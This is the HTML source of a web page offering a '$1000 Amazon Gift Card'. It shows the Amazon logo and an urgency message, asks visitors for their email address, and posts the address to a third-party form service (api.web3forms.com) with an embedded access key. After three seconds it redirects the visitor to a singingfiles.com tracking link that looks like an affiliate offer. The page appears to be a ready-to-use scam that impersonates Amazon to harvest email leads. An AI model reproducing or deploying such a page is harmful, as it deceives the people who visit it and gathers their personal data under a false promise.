<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Win a $1000 Amazon Gift Card</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #e9f6f6;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      flex-direction: column;
    }
    .box {
      background: white;
      padding: 30px 20px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 90%;
      text-align: center;
    }
    .box img {
      width: 100%;
      border-radius: 8px;
    }
    .box input, .box button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    .box button {
      background: #e48c00;
      color: white;
      font-weight: bold;
      border: none;
    }
    .thankyou {
      display: none;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="box" id="formBox">
    <h2>Win a $1000 Amazon Gift Card!</h2>
    <p>Enter your email below and claim your chance. This offer won't last long!</p>
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
    
    <form id="leadForm">
      <input type="email" name="email" placeholder="Enter your email" required />
      <input type="hidden" name="access_key" value="0dcca38e-523a-4c4a-9f0c-1488002d5763" />
      <button type="submit">Claim Now</button>
    </form>
  </div>

  <div class="thankyou" id="thankYouBox">
    <h2>Thank you!</h2>
    <p>Redirecting to your offer...</p>
  </div>

  <script>
    document.getElementById("leadForm").addEventListener("submit", function(e){
      e.preventDefault();
      const form = e.target;

      fetch("https://api.web3forms.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          access_key: form.access_key.value,
          email: form.email.value
        })
      }).then(response => {
        if (response.ok) {
          document.getElementById("formBox").style.display = "none";
          document.getElementById("thankYouBox").style.display = "block";
          setTimeout(() => {
            window.location.href = "https://singingfiles.com/show.php?l=0&u=178843&id=68652";
          }, 3000);
        } else {
          alert("There was an error, please try again.");
        }
      });
    });
  </script>

</body>
</html>
